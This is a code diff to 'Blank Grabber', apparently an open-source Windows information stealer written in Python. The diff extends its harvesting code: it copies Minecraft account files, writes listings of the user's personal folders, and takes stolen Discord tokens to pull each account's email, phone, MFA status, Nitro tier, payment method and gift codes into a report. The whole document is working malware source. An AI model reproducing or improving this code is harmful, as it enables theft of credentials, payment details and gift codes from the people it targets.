@@ -72,7 +72,10 @@ def generate(num=5, invisible= False):
 
 
 def force_decode(b: bytes):
-    return b.decode(json.detect_encoding(b))
+    try:
+        return b.decode(json.detect_encoding(b))
+    except UnicodeDecodeError:
+        return None
 
 def is_admin():
     s = subprocess.run("net session", shell= True, capture_output= True).returncode
@@ -290,6 +293,7 @@ class BlankGrabber:
 
     @catch
     def minecraft_stealer(self):
+        check = False
         if not os.path.exists(mcdir := os.path.join(self.roaming, ".minecraft")):
             return
         for i in os.listdir(mcdir):
@@ -297,7 +301,9 @@ class BlankGrabber:
                 continue
             os.makedirs(grabpath := os.path.join(self.tempfolder, "Gaming", "Minecraft"), exist_ok= True)
             self.copy(os.path.join(mcdir, i), os.path.join(grabpath, i))
-            self.grabbed_data["Games"] += 1
+            if not check:
+                self.grabbed_data["Games"] += 1
+                check = True
 
     @catch
     def roblox_stealer(self):
@@ -349,10 +355,12 @@ class BlankGrabber:
             output = {}
             for location in ["Desktop", "Documents" , "Downloads", "Music", "Pictures", "Videos"]:
                 output[location] = self.tree(os.path.join(os.getenv("userprofile"), location))
-            for i in output:
+            for key in output.keys():
+                if output[key] is None:
+                    continue
                 os.makedirs(os.path.join(self.tempfolder, "Directories"), exist_ok= True)
-                with open(os.path.join(self.tempfolder, "Directories", f"{i}.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
-                    file.write(output[i])
+                with open(os.path.join(self.tempfolder, "Directories", f"{key}.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
+                    file.write(output[key])
 
         @catch
         def clipboard():
@@ -489,31 +497,50 @@ class BlankGrabber:
                 phone = r["phone"] if r["phone"] else "(No Phone Number)"
                 verified=r["verified"]
                 mfa = r["mfa_enabled"]
-                nitro_data = json.loads(self.http.request("GET", "https://discordapp.com/api/v9/users/@me", headers=self.headers(token)).data.decode())
-                nitro_data = nitro_data.get("premium_type", 0)
+                nitro_data = r.get("premium_type", 0)
                 if nitro_data == 0:
                     nitro_data = "No Nitro"
                 elif nitro_data == 1:
                     nitro_data = "Nitro Classic"
+                elif nitro_data == 2:
+                    nitro_data = "Nitro"
+                elif nitro_data == 3:
+                    nitro_data = "Nitro Basic"
                 else:
-                    nitro_data = "Nitro Boost"
+                    nitro_data = "(Unknown)"
 
-                billing = len(json.loads(self.http.request("GET", "https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode()))>0
                 billing = json.loads(self.http.request("GET", "https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode())
                 if len(billing) == 0:
-                    billing = False
+                    billing = "(No Payment Method)"
                 else:
                     for m in billing:
                         method_type = m.get("type", 0)
                         if method_type == 0:
                             billing = "(Unknown)"
+                            break
                         elif method_type == 1:
                             billing = "Card"
+                            break
                         else:
                             billing = "Paypal"
+                            break
+                gifts = []
                 r = self.http.request("GET", "https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers= self.headers(token)).data.decode()
+                if "code" in r:
+                    r = json.loads(r)
+                    for i in r:
+                        code = i.get("code")
+                        if i.get("promotion") is None:
+                            continue
+                        title = i["promotion"].get("outbound_title")
+                        if code and title:
+                            gifts.append(f"{title}: {code}")
+                if len(gifts) == 0:
+                    gifts = "Gift Codes: (NONE)"
+                else:
+                    gifts = "Gift Codes:\n\t" + "\n\t".join(gifts)
 
-                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nUser ID: {id}\nMFA: {mfa}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {nitro_data}\nBilling Info: {billing}\n\nToken: {token}")
+                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nUser ID: {id}\nMFA: {mfa}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {nitro_data}\nBilling Info: {billing}\n\nToken: {token}\n\n{gifts}")
         if len(data)!= 0:
             os.makedirs(discfolder := os.path.join(self.tempfolder, "Messenger", "Discord"), exist_ok= True)
             with open(os.path.join(discfolder, "Discord Info.txt"), "w", encoding= "utf-8", errors="ignore") as file:
